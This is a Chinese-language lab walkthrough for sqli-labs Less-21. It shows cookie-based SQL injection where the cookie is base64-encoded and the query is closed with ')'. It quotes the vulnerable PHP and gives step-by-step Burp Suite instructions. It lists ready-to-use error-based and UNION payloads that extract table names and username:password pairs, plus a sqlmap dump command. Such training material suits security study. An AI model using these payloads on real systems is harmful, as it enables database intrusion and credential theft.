# Less-21 — Cookie 注入 / base64 / 报错注入

## 源码分析

```php
setcookie('uname', base64_encode($row1['username']));  // base64 编码
$cookee = base64_decode($cookee);
$sql="SELECT * FROM users WHERE username=('$cookee')"; // 闭合 ')
```

相比 Less-20 多了两个变化：
1. Cookie 值做了 **base64 编码**
2. 闭合从 `'` 变成 **`')`**

## 操作步骤

1. 正确登录（Dumb/Dumb）拿到合法 cookie
2. Burp 里找到请求 → 看到 `Cookie: uname=RHVtYg==`（Dumb 的 base64）
3. 把 payload（未编码）粘贴到 Cookie 值位置
4. 选中 → 右键 → **Extensions → Encode → base64**（或 Ctrl+Shift+B）
5. 发送

## Payload（Burp 里填这些，选中后 base64 编码）

```
1') and updatexml(1,concat(0x7e,(select database())),1) --+

1') and updatexml(1,concat(0x7e,version()),1) --+

1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+

1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1) --+

1') and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1) --+
```

## UNION 注入（有回显）

```
-1') union select 1,2,3 --+

-1') union select 1,group_concat(username),group_concat(password) from users --+
```

## sqlmap

```bash
sqlmap -u "http://ip:8848/Less-21/" --cookie="uname=RHVtYg==" --batch --level=3 --dbms=mysql -D security -T users --dump
```
